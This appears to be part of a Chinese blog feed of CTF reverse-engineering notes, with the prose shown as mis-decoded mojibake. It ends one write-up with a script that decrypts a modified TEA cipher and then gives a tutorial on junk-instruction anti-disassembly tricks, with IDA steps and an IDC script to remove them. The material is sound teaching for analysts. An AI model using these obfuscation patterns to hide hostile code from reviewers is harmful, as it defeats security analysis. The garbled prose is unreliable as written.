ä¸º%pï¼Œæ‰€ä»¥æ¯ä¸€è½®ç®—å®Œéƒ½å°äºpä¸”æ˜¯æ­£æ•°ï¼Œé‚£ä¹ˆåªè¦å°äº0çš„æ—¶å€™+på³å¯ï¼Œå¾—åˆ°é«˜ä½ä½åç§»ä½å†ç›¸åŠ å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># flag = &quot;flag&#123;*****&#125;&quot;</span><br><span class="hljs-comment"># assert len( flag ) == 25</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># a = &quot;&quot;</span><br><span class="hljs-comment"># for i in flag:</span><br><span class="hljs-comment">#     a += hex(ord(i))[2:]</span><br><span class="hljs-comment"># l = int(a,16).bit_length()</span><br><span class="hljs-comment"># print(&quot;l  =&quot; , l )</span><br><br><span class="hljs-comment"># v0 = int(a,16)&gt;&gt;(l//2)</span><br><span class="hljs-comment"># v1 = int(a,16)-(v0&lt;&lt;(l//2))</span><br><span class="hljs-comment"># p = getPrime(l//2+10)</span><br><br><br>derta = <span class="hljs-number">462861781278454071588539315363</span><br>v2 = derta*<span class="hljs-number">32</span><br>v3 = <span class="hljs-number">489552116384728571199414424951</span><br>v4 = <span class="hljs-number">469728069391226765421086670817</span><br>v5 = <span class="hljs-number">564098252372959621721124077407</span><br>v6 = <span class="hljs-number">335640247620454039831329381071</span><br><span class="hljs-comment"># assert v1 &lt; p and v0 &lt; p and derta &lt; p and v3 &lt; p and v4 &lt; p and v5 &lt; p and v6 &lt; p</span><br><br>v0 = <span class="hljs-number">190997821330413928409069858571234</span><br>v1 = <span class="hljs-number">137340509740671759939138452113480</span><br>p = <span class="hljs-number">446302455051275584229157195942211</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    v2 -= derta<br>    <span class="hljs-keyword">while</span> v2 &lt; <span class="hljs-number">0</span>:<br>        v2 += p<br>    v0 -= (v1+v2) ^ ( <span class="hljs-number">8</span>*v1 + v5 ) ^ ( (v1&gt;&gt;<span class="hljs-number">7</span>) + v6 )<br>    <span class="hljs-keyword">while</span> v0&lt;<span class="hljs-number">0</span>:<br>        v0+=p<br>    v1 -= (v0+v2) ^ ( <span class="hljs-number">8</span>*v0 + v3 ) ^ ( (v0&gt;&gt;<span class="hljs-number">7</span>) + v4 )<br>    <span class="hljs-keyword">while</span> v1&lt;<span class="hljs-number">0</span>:<br>        v1+=p<br><br><br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;v0 =&quot;</span> , v0 )<br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;v1 =&quot;</span> , v1 )<br><br>v0_2_v1 = <span class="hljs-number">1014351839000028912764735400942</span>&lt;&lt;<span class="hljs-number">99</span><br>v1 = <span class="hljs-number">348231531876293114407512127357</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v0_2_v1+v1))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>teaé­”æ”¹</tag>
      
      <tag>RSA</tag>
      
      <tag>blowfishåŠ å¯†</tag>
      
      <tag>çˆ†ç ´flag</tag>
      
      <tag>base64é­”æ”¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>èŠ±æŒ‡ä»¤</title>
    <link href="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
    <url>/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://blog.csdn.net/m0_51246873/article/details/127167749">https://blog.csdn.net/m0_51246873/article/details/127167749</a></p><p><a href="https://www.cnblogs.com/YenKoc/p/14136012.html">https://www.cnblogs.com/YenKoc/p/14136012.html</a></p><p><a href="https://www.xjx100.cn/news/40167.html?action=onClick">https://www.xjx100.cn/news/40167.html?action=onClick</a></p><p><a href="https://mp.weixin.qq.com/s/MUth1Qw-Fl2a5OrLw_2_0g">https://mp.weixin.qq.com/s/MUth1Qw-Fl2a5OrLw_2_0g</a></p><h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><ul><li>çº¿æ€§æ‰«æç®—æ³•ï¼šé€è¡Œåæ±‡ç¼–ï¼ˆæ— æ³•å°†æ•°æ®å’Œå†…å®¹è¿›è¡ŒåŒºåˆ†ï¼‰</li><li>é€’å½’ä¸‹é™ç®—æ³•ï¼šæ ¹æ®ä¸€æ¡æŒ‡ä»¤æ˜¯å¦è¢«å¦ä¸€æ¡æŒ‡ä»¤å¼•ç”¨æ¥å†³å®šæ˜¯å¦å¯¹å…¶è¿›è¡Œåæ±‡ç¼–ï¼ˆéš¾ä»¥å‡†ç¡®å®šä½ï¼‰</li></ul><p>æ­£æ˜¯å› ä¸ºè¿™ä¸¤ç§åæ±‡ç¼–çš„è§„æ ¼å’Œç¼ºé™·æœºåˆ¶ï¼Œæ‰€ä»¥æ‰å¯¼è‡´äº†ä¼šæœ‰èŠ±æŒ‡ä»¤çš„è¯ç”Ÿ</p><p><strong>èŠ±æŒ‡ä»¤ç®€å•çš„è¯´å°±æ˜¯åœ¨ä»£ç ä¸­æ··å…¥ä¸€äº›åƒåœ¾æ•°æ®é˜»ç¢ä½ çš„é™æ€åˆ†æ</strong></p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1690873982788-dd770c8d-bb78-4af2-823a-f2f07ccfb7d7-17318416670861.png" class="" title="img"><h3 id="å¸¸è§æŒ‡ä»¤"><a href="#å¸¸è§æŒ‡ä»¤" class="headerlink" title="å¸¸è§æŒ‡ä»¤"></a>å¸¸è§æŒ‡ä»¤</h3><ul><li>0xE8 call + 4å­—èŠ‚åç§»åœ°å€</li><li>0xE9 jmp + 4å­—èŠ‚åç§»åœ°å€</li><li>0xEB jmp + 2å­—èŠ‚åç§»åœ°å€</li><li>0xFF15 call + 4å­—èŠ‚åœ°å€</li><li>0xFF25 jmp + 4å­—èŠ‚åœ°å€</li><li>0xcc int 3</li><li>0xe2 loop</li><li>0x0f84 jz</li><li>0x0f85 jnz</li></ul><p>æŒ‡ä»¤ä¹Ÿä¸ä¸€å®šå”¯ä¸€ï¼Œæ¯”å¦‚ä¸Šé¢æœ‰ä¸¤ç§è¡¨ç¤ºcallçš„æ–¹å¼ï¼Œ0x74ä¹Ÿèƒ½è¡¨ç¤ºjz</p><h1 id="å¸¸è§„"><a href="#å¸¸è§„" class="headerlink" title="å¸¸è§„"></a>å¸¸è§„</h1><h3 id="1-ç®€å•jmp"><a href="#1-ç®€å•jmp" class="headerlink" title="1.ç®€å•jmp"></a>1.ç®€å•jmp</h3><p>ODèƒ½è¢«éª—è¿‡å»ï¼Œä½†æ˜¯å› ä¸ºidaä¸»è¦é‡‡ç”¨çš„æ˜¯é€’å½’æ‰«æçš„åŠæ³•ï¼ˆä¼šç”¨çº¿æ€§æ‰«æè¡¥å……ï¼‰æ‰€ä»¥èƒ½å¤Ÿæ­£å¸¸è¯†åˆ«</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689132929883-c68c1e41-0162-4c74-913b-551c5afe5f80-17318416670873.png" class="" title="img"><h3 id="2-jx-jnxï¼ˆxå¯ä¸ºe-z-lï¼‰"><a href="#2-jx-jnxï¼ˆxå¯ä¸ºe-z-lï¼‰" class="headerlink" title="2.jx+jnxï¼ˆxå¯ä¸ºe,z,lï¼‰"></a>2.jx+jnxï¼ˆxå¯ä¸ºe,z,lï¼‰</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1710308207074-a45f1d13-e450-4c83-8d4e-3b531590a98a-17318416670875.png" class="" title="img"><p>jnzå®é™…ä¸Šæ˜¯fakeçš„ï¼Œå› ä¸ºjzè¿™ä¸ªæŒ‡ä»¤ï¼Œè®©idaè®¤ä¸ºjzä¸‹é¢çš„æ˜¯å¦å¤–ä¸€ä¸ªåˆ†æ”¯ï¼Œæ‰€ä»¥è¿™é‡Œå°†jzä¸‹é¢åŒ…æ‹¬jz å…¨è½¬åŒ–ä¸ºä»£ç </p><p>callæŒ‡ä»¤æŒ‰uï¼Œä¸‹ä¸€è¡ŒæŒ‰cï¼Œå†nop callï¼ŒæŠŠ90è½¬ä¸ºæ•°æ®ï¼Œå†æŒ‰cå˜ä¸ºnop</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1710308276009-3e1cf075-5d20-4a29-9902-c3d243f64169-17318416670877.png" class="" title="img"><h3 id="3-call-add-espï¼Œ4æˆ–call-add-esp-n-retn"><a href="#3-call-add-espï¼Œ4æˆ–call-add-esp-n-retn" class="headerlink" title="3.call +add espï¼Œ4æˆ–call + add [esp], n + retn"></a>3.call +add espï¼Œ4æˆ–call + add [esp], n + retn</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689132096401-0cbd1787-69f8-4b7f-80f1-c4d7af1f2d3c-17318416670879.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689132119030-6bfac8d1-f372-4c48-b08e-aada3cf8666b-173184166708711.png" class="" title="img"><p>2023.7.8å‡Œæ­¦æ¯flower_tea</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1688832992845-dc3216df-b044-4b15-8e3f-c46c5273d912-173184166708713.png" class="" title="img"><p>è¿™é‡ŒcallæŒ‡ä»¤ï¼Œå…¶å®æœ¬è´¨å°±æ˜¯jmp&amp;push ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä½†æ˜¯è¿™é‡Œå…¶å®å°±æ˜¯ä¸€ä¸ªjmpæŒ‡ä»¤ï¼Œpushè¿™æ¡æŒ‡ä»¤æ˜¯å¤šä½™çš„ï¼Œéœ€è¦add esp,4 è°ƒæ•´å †æ ˆï¼Œä½†æ˜¯idaä¼šé»˜è®¤æŠŠcall åé¢çš„é‚£ä¸ªåœ°å€å½“æˆä¸€ä¸ªå‡½æ•°</p><p>æ˜“è¯­è¨€è‡ªå¸¦çš„èŠ±æŒ‡ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">004010BF   .  E8 <span class="hljs-number">00000000</span>   call <span class="hljs-number">1111.004010</span>C4<br>004010C4  /$  <span class="hljs-number">830424</span> 06     add dword ptr ss:[esp],<span class="hljs-number">0x6</span><br>004010C8  \.  C3            retn<br>004010C9      B9            db B9<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„addï¼Œæ˜¯å°†call 00hçš„è¿”å›çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯[esp]+0x6ï¼ˆadd çš„å››ä¸ªå­—èŠ‚+C3 B9ï¼‰</p><p>æ¥å®ç°ä¸€ä¸ªè·³è½¬ï¼Œåˆ°004010CAï¼Œå¯¹äºè¿™ç§ï¼Œåªéœ€è¦å°†ä¸‹é¢çš„ç‰¹å¾ç patchæ‰å°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">E80000000083042406C3??<br></code></pre></td></tr></table></figure><h3 id="4-jmp-XXXï¼ˆçº¢è‰²ï¼‰"><a href="#4-jmp-XXXï¼ˆçº¢è‰²ï¼‰" class="headerlink" title="4.jmp XXXï¼ˆçº¢è‰²ï¼‰"></a>4.jmp XXXï¼ˆçº¢è‰²ï¼‰</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689130406691-d483f269-7400-471d-921a-58becb8e1681-173184166708715.png" class="" title="img"><p>è¿™ä¹Ÿæ˜¯ä¸€ç§éå¸¸å¸¸è§çš„èŠ±æŒ‡ä»¤ï¼Œå…¶å®è¿™é‡Œå¾ˆæ˜æ˜¾å°±æœ‰é—®é¢˜ï¼Œå› ä¸ºè™šæ‹Ÿåœ°å€æ€ä¹ˆå¯èƒ½é‚£ä¹ˆå¤§ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹èŠ±æŒ‡ä»¤æºä»£ç </p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689130477926-fe2e0737-f5c7-4586-83d9-72b896e74670-173184166708717.png" class="" title="img"><p> å®é™…æ˜¯e9åœ¨æé¬¼ï¼Œidaä¼šé»˜è®¤å°†e9åé¢çš„4ä¸ªå­—èŠ‚å½“æˆåœ°å€ï¼Œåªè¦nopæ‰jmp(E9)å°±å¥½äº†</p><p>é¢˜ç›®ç»ƒä¹ ï¼š<a href="https://www.nssctf.cn/note/set/2970">https://www.nssctf.cn/note/set/2970</a></p><h3 id="5-stx-jx"><a href="#5-stx-jx" class="headerlink" title="5.stx&#x2F;jx"></a>5.stx&#x2F;jx</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689130320004-5dc18a4f-ac2c-4cb7-8065-9f523e82f2d0-173184166708721.png" class="" title="img"><p>clcæ˜¯æ¸…é™¤EFlagså¯„å­˜å™¨çš„carryä½çš„æ ‡å¿—ï¼Œè€Œjnbæ˜¯æ ¹æ®cf&#x3D;&#x3D;0æ—¶è·³è½¬çš„ï¼Œç„¶è€Œjnbè¿™ä¸ªåˆ†æ”¯æŒ‡ä»¤ï¼Œidaåˆå°†åé¢çš„éƒ¨åˆ†è®¤ä½œæˆäº†å¦å¤–çš„åˆ†æ”¯ã€‚</p><h3 id="6-æ±‡ç¼–æŒ‡ä»¤å…±ç”¨opcode"><a href="#6-æ±‡ç¼–æŒ‡ä»¤å…±ç”¨opcode" class="headerlink" title="6.æ±‡ç¼–æŒ‡ä»¤å…±ç”¨opcode"></a>6.æ±‡ç¼–æŒ‡ä»¤å…±ç”¨opcode</h3><p>inc eaxå’Œdec eaxæŠµæ¶ˆå½±å“ï¼Œè¿™ç§å…±ç”¨opcodeç¡®å®æ¯”è¾ƒéº»çƒ¦</p><h1 id="åˆ›æ„"><a href="#åˆ›æ„" class="headerlink" title="åˆ›æ„"></a>åˆ›æ„</h1><h3 id="1-æ›¿æ¢retæŒ‡ä»¤"><a href="#1-æ›¿æ¢retæŒ‡ä»¤" class="headerlink" title="1.æ›¿æ¢retæŒ‡ä»¤"></a>1.æ›¿æ¢retæŒ‡ä»¤</h3><p>callæŒ‡ä»¤çš„æœ¬è´¨ï¼špush å‡½æ•°è¿”å›åœ°å€ç„¶åjmp å‡½æ•°åœ°å€</p><p>retæŒ‡ä»¤çš„æœ¬è´¨ï¼š pop eip</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨callæŒ‡ä»¤ä¹‹åï¼Œæ˜ç™½å‡½æ•°è¿”å›åœ°å€å­˜æ”¾äºespï¼Œå¯ä»¥å°†å€¼å–å‡ºï¼Œç”¨è·³è½¬æŒ‡ä»¤è·³è½¬åˆ°è¯¥åœ°å€ï¼Œå³å¯ä»£æ›¿retæŒ‡ä»¤</p><h3 id="2-æ§åˆ¶æ ‡å¿—å¯„å­˜å™¨è·³è½¬"><a href="#2-æ§åˆ¶æ ‡å¿—å¯„å­˜å™¨è·³è½¬" class="headerlink" title="2.æ§åˆ¶æ ‡å¿—å¯„å­˜å™¨è·³è½¬"></a>2.æ§åˆ¶æ ‡å¿—å¯„å­˜å™¨è·³è½¬</h3><p>è¿™ä¸€éƒ¨åˆ†éœ€è¦ç²¾é€šæ ‡å¿—å¯„å­˜å™¨ï¼Œæ¯ä¸€ä¸ªæ“ä½œç éƒ½ä¼šå¯¹ç›¸åº”çš„æ ‡å¿—å¯„å­˜å™¨äº§ç”Ÿç›¸åº”çš„å½±å“ï¼Œå¦‚æœå¯¹æ ‡å¿—å¯„å­˜å™¨è¶³å¤Ÿç†Ÿç»ƒï¼Œå°±å¯ä»¥ä½¿ç”¨å¯¹åº”çš„è·³è½¬æŒ‡ä»¤æ„é€ æ°¸æ’è·³è½¬ã€‚</p><h3 id="3-åˆ©ç”¨å‡½æ•°è¿”å›ç¡®å®šå€¼"><a href="#3-åˆ©ç”¨å‡½æ•°è¿”å›ç¡®å®šå€¼" class="headerlink" title="3.åˆ©ç”¨å‡½æ•°è¿”å›ç¡®å®šå€¼"></a>3.åˆ©ç”¨å‡½æ•°è¿”å›ç¡®å®šå€¼</h3><p>æœ‰äº›å‡½æ•°è¿”å›å€¼æ˜¯ç¡®å®šçš„ï¼Œæ¯”å¦‚æˆ‘ä»¬<strong>è‡ªå·±å†™çš„å‡½æ•°</strong>ï¼Œè¿”å›å€¼å¯ä»¥æ˜¯ä»»æ„éé›¶æ•´æ•°ï¼›å¦‚æœæˆ‘ä»¬æ•…æ„ä¼ å…¥ä¸€ä¸ª<strong>ä¸å­˜åœ¨çš„æ¨¡å—</strong>åç§°ï¼Œé‚£ä¹ˆä»–å°±ä¼šè¿”å›ä¸€ä¸ªç¡®å®šçš„å€¼NULLï¼›å¦ä¸€æ–¹é¢ï¼Œ<strong>æŸäº›apiå‡½æ•°</strong>ï¼Œæˆ‘ä»¬æ—¢ç„¶ä½¿ç”¨ä»–ï¼Œè‚¯å®šå°±æ˜¯ä¸€å®šè¦è°ƒç”¨æˆåŠŸçš„ï¼Œè€Œè¿™äº›apiå‡½æ•°åŸºæœ¬ä¸Šåªè¦è°ƒç”¨æˆåŠŸå°±å°±ä¼šè¿”å›ä¸€ä¸ªç¡®å®šçš„é›¶æˆ–è€…éé›¶å€¼ï¼Œå¦‚MessageBoxã€‚è¿™äº›éƒ½å¯ä»¥æ„é€ æ°¸æ’è·³è½¬</p><h3 id="4-é’ˆå¯¹åç¼–è¯‘"><a href="#4-é’ˆå¯¹åç¼–è¯‘" class="headerlink" title="4.é’ˆå¯¹åç¼–è¯‘"></a>4.é’ˆå¯¹åç¼–è¯‘</h3><p>0x1165 å¼€å§‹çš„èŠ±æŒ‡ä»¤å’Œå‰é¢çš„èŠ±æŒ‡ä»¤åŸæ¥ç›¸ä¼¼ï¼Œè¿™æ¡èŠ±æŒ‡ä»¤ä¼šä½¿ IDA è¯¯ä»¥ä¸º 0x116B å¤„çš„æŒ‡ä»¤å¯èƒ½ä¼šæ‰§è¡Œï¼Œå¯¼è‡´ IDA çš„æ ˆåˆ†æå‡ºç°é”™è¯¯</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689131712545-813564aa-eea6-4a1e-97a2-e32f0d8b267f-173184166708719.png" class="" title="img"><p>ä¿®å¤æ–¹æ³•é™¤äº†patch å¤–è¿˜æœ‰ä¿®æ”¹ ida å¯¹æ ˆçš„åˆ†æç»“æœ</p><p>åœ¨Options - Generalèœå•ä¸­å‹¾ä¸ŠStack pointeré€‰é¡¹å¯ä»¥æŸ¥çœ‹æ¯è¡ŒæŒ‡ä»¤æ‰§è¡Œä¹‹å‰çš„æ ˆå¸§å¤§å°</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689131809983-7cfe2182-9372-47af-948d-a4929bfaf1a0-173184166708723.png" class="" title="img"><p><strong>Alt + K</strong> å¯ä»¥ä¿®æ”¹æŸæ¡æŒ‡ä»¤å¯¹æ ˆæŒ‡é’ˆçš„å½±å“ï¼Œä»è€Œæ¶ˆé™¤è¿™æ¡èŠ±æŒ‡ä»¤å¯¹åç¼–è¯‘çš„å½±å“ã€‚</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689131828475-4df12a32-cb43-4794-b74c-06ac9c412d4b-173184166708725.png" class="" title="img"><h1 id="æ¸…é™¤"><a href="#æ¸…é™¤" class="headerlink" title="æ¸…é™¤"></a>æ¸…é™¤</h1><h3 id="nopå•å­—èŠ‚-E8"><a href="#nopå•å­—èŠ‚-E8" class="headerlink" title="nopå•å­—èŠ‚(E8)"></a>nopå•å­—èŠ‚(E8)</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689129981491-9780d557-5835-434d-b50c-347ec712839d-173184166708727.png" class="" title="img"><p>åœ¨0x401051è®¾ç½®ä¸ºæ•°æ®ç±»å‹ï¼ˆå¿«æ·é”®Dï¼‰ï¼Œå°†call è½¬æˆç¡¬ç¼–ç  E8  å†å°†å…‰æ ‡æ”¾åˆ° db 0E8ä¸Š å°†E8æ”¹æˆ nop(90) å†æ¬¡æŒ‰Cé”®ï¼ˆè½¬åŒ–ä¸ºä»£ç ç±»å‹ï¼‰ç‚¹yes å°†ç¡¬ç¼–ç ä¿®å¤æˆä»£ç   </p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689129948281-3c96bdf6-b2d0-4ed6-b03a-96c09a113d05-173184166708729.png" class="" title="img"><p> ç„¶åå‘ä¸‹é€â¼€ä¿®å¤ å°†å…‰æ ‡æ”¾ç½®åœ¨é»„è‰²çš„è¡Œä¸Š æŒ‰Cä¿®å¤ ç›´åˆ°æ²¡æœ‰é»„è‰²åœ°å€  </p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1690874316013-0dc03fcc-d61c-4258-8871-9317f39fb4d0-173184166708731.png" class="" title="img"><p>æœ€åå…¨é€‰å‡½æ•°ï¼ŒæŒ‰Pç”Ÿæˆå‡½æ•°  </p><p>ç»ƒä¹ é¢˜ç›®ï¼š<a href="https://www.nssctf.cn/problem/2313">https://www.nssctf.cn/problem/2313</a></p><h3 id="nopè·¨è¶Šæ±‡ç¼–æŒ‡ä»¤"><a href="#nopè·¨è¶Šæ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="nopè·¨è¶Šæ±‡ç¼–æŒ‡ä»¤"></a>nopè·¨è¶Šæ±‡ç¼–æŒ‡ä»¤</h3><p>jzæŒ‡ä»¤æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ä¸­é—´</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721640647545-dd50b515-f521-4501-b0ac-ade8f929332c-173184166708733.png" class="" title="img"><p>è¿™ä¸ªæ—¶å€™è®©jzæ­£å¸¸åˆ†æï¼Œä¹Ÿå°±æ˜¯æŠŠä¸­é—´çš„nop</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721640588103-58532352-feaa-4624-8ee7-324144d86673-173184166708735.png" class="" title="img"><p>å¦‚æœåé¢æœ‰æ•°æ®æ²¡è¢«åˆ†æä¸ºcodeï¼Œéœ€è¦é‡æ–°åˆ†æä¸€ä¸‹</p><h3 id="nopéƒ¨åˆ†æ±‡ç¼–"><a href="#nopéƒ¨åˆ†æ±‡ç¼–" class="headerlink" title="nopéƒ¨åˆ†æ±‡ç¼–"></a>nopéƒ¨åˆ†æ±‡ç¼–</h3><p>ä¸€èˆ¬å»èœå•ä¸­çš„ç¼–è¾‘é€‰é¡¹ä¿®è¡¥å•å­—èŠ‚ä¼šæ¯”è¾ƒå¥½æŠŠæ§</p><p>åƒä¸‹é¢è¿™ç§çº¢è‰²æ ‡å¿—ç¦»åŸå‡½æ•°æœ‰ä¸€å®šè·ç¦»åˆæ˜¯call+retnç»„åˆï¼Œ400f64åˆæ²¡ä»€ä¹ˆç”¨ï¼Œè¿˜æœ‰retä¼šå¹²æ‰°å‡½æ•°çš„åˆ†æï¼Œé‚£å°±éƒ½nopï¼Œæ˜¯ä¸€ç§æš´åŠ›ç ´è§£æ–¹æ³•</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1680614545893-5a9467cb-a38f-4a66-9ebc-5506ba940905-173184166708737.png" class="" title="img"><p>nopå®Œåçœ‹åˆ°æœ‰%lld,åˆ é™¤å‡½æ•°ï¼Œä¿®è¡¥å‡½æ•°å³å¯åç¼–è¯‘</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1695203286928-b18e1793-6220-4139-97b7-d909022c273d-173184166708739.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721878266076-1962ee79-d068-49ba-9302-a5df50bc55b1-173184166708741.png" class="" title="img"><p>xchgå¾ˆå°‘ç”¨åˆ°ï¼Œåé¢è¿˜æœ‰retnï¼Œä¸»æ‰“ä¸æƒ³è¦çš„ç›´æ¥å…¨éƒ¨nop</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721878843936-e7e7246a-ab3e-410d-88c1-171b5cbabba5-173184166708743.png" class="" title="img"><p>å…ˆå¯ä»¥å°èŒƒå›´çš„å°è¯•ï¼ŒæŠŠcallåˆ°çº¢è‰²çš„åœ°æ–¹å…ˆnopï¼Œå‘ç°ä¸è¡Œï¼Œå†ä»å¤´æŠŠå…³é”®æ•°æ®ä¹‹å‰ï¼ˆD7,flag isä¸Šé¢é‚£ä¸€è¡Œ)ä¹Ÿç»™nopæ‰ï¼Œå‘ç°å¯ä»¥äº†</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1690696323005-2d1cf95f-3233-4c21-9000-ce3fafa87e2e-173184166708745.png" class="" title="img"><h3 id="æ ¹æ®æ±‡ç¼–æŒ‡ä»¤"><a href="#æ ¹æ®æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="æ ¹æ®æ±‡ç¼–æŒ‡ä»¤"></a>æ ¹æ®æ±‡ç¼–æŒ‡ä»¤</h3><p>è¿™é‡Œæ±‡ç¼–è¯­å¥ä¹‹é—´çªç„¶æœ‰dbæœ‰ç‚¹å¯ç–‘ï¼Œè€Œ48è¡¨ç¤ºmovï¼Œä¸€èˆ¬æ˜¯å¼€å¤´çš„æœºå™¨ç </p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1722916980055-d0de8f1f-279a-4d7f-a0a5-7f7a0cf4c771-173184166708747.png" class="" title="img"><p>è¿™é‡ŒæŠŠ0x12ä»¥ä¸‹çš„é‡æ–°åˆ†æï¼Œå°±å¯ä»¥å¾—åˆ°key</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1722917002876-cfa0e989-69ba-4b1a-9102-4580be626109-173184166708749.png" class="" title="img"><h3 id="ä»£ç è‡ªåŠ¨å»èŠ±"><a href="#ä»£ç è‡ªåŠ¨å»èŠ±" class="headerlink" title="ä»£ç è‡ªåŠ¨å»èŠ±"></a>ä»£ç è‡ªåŠ¨å»èŠ±</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;idc.idc&gt;</span><br>static main()&#123;<br>auto addr_start =<span class="hljs-number">0x00415990</span>;//å‡½æ•°èµ·å§‹åœ°å€<br>auto addr_end = <span class="hljs-number">0x00416048</span>;//å‡½æ•°ç»“æŸåœ°å€<br>auto i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=addr_start;i&lt;addr_end;i++)&#123;<br>          <span class="hljs-keyword">if</span>(Dword(i) == <span class="hljs-number">0x1E8</span>)&#123;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">6</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span class="hljs-number">0x90</span>);<br>              &#125;<br>              i=i+<span class="hljs-number">4</span>;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">3</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span class="hljs-number">0x90</span>);<br>              &#125;<br>              i=i+<span class="hljs-number">10</span>;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">3</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span 